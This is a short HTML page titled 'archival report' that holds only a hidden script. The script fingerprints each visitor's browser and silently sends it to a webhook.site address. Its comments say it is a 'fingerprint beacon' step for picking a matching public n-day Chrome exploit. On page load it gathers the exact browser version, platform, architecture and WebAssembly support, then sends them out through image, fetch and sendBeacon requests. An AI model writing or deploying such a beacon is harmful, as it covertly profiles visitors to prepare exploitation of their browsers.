<!doctype html>

<head><meta charset="utf-8"><title>report</title></head>
<body>
<h1>archival report</h1>
<script>
// STEP 1.5 fingerprint beacon.
// Reports the EXACT Chrome build + platform to our webhook, so we can pick the
// matching public n-day exploit. Replace WEBHOOK below with your webhook.site URL.
const WEBHOOK = "https://webhook.site/db083567-dedf-4172-bec5-a0fb04e3bd30";

function beacon(obj){
  const q = encodeURIComponent(JSON.stringify(obj));
  // multiple channels in case one is blocked
  new Image().src = WEBHOOK + "/fp?d=" + q;
  try { fetch(WEBHOOK + "/fp2", {method:"POST", body: JSON.stringify(obj)}); } catch(e){}
  try { navigator.sendBeacon(WEBHOOK + "/fp3", JSON.stringify(obj)); } catch(e){}
}

async function run(){
  let out = { ua: navigator.userAgent, plat: navigator.platform, hw: navigator.hardwareConcurrency };
  try {
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      const hev = await navigator.userAgentData.getHighEntropyValues(
        ["architecture","bitness","model","platform","platformVersion",
         "uaFullVersion","fullVersionList","wow64"]);
      out.hev = hev;               // <-- uaFullVersion e.g. "130.0.6723.116"
    }
  } catch(e){ out.hev_err = String(e); }
  // feature probes that hint which V8 flags are enabled
  out.wasm = (typeof WebAssembly !== "undefined");
  try { out.wasm_streaming = (typeof WebAssembly.compileStreaming === "function"); } catch(e){}
  beacon(out);
}
run();
</script>
